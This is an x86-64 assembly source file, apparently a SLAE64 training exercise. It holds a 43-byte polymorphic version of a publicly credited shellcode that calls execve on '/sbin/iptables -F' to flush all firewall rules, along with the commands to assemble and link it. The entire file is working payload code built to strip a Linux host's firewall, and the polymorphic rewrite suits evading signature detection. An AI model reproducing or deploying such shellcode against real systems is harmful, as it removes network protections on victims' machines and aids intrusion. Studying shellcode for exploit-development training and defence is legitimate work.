; Author : SLAE64-PA-6470 (kahlon81)
; Date : 2018/02/21
;
; Linux/x86-64 - execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL) - 43 bytes
;
; nasm -f elf64 shellcode-683-polymorphic.nasm -o shellcode-683-polymorphic.o
; ld shellcode-683-polymorphic.o -o shellcode-683-polymorphic
; 
; Original shellcode :
;
; http://shell-storm.org/shellcode/files/shellcode-683.php
;
; Title: Linux/x86-64 - execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL) - 49 bytes
; Author: 10n1z3d <10n1z3d[at]w[dot]cn>
; Date: Fri 09 Jul 2010 03:26:12 PM EEST
     
section .text
global _start
         
_start:
    xor     rax, rax
	push    rax

	push    word 0x462d
    mov     rcx, rsp

jmp call_shellcode 
shellcode:
	pop rdi

    push    rax
    push    rcx
    push    rdi
    mov     rsi, rsp
         
    mov     al, 0x3b
    syscall

call_shellcode:
	call shellcode
	iptables: db '/sbin/iptables'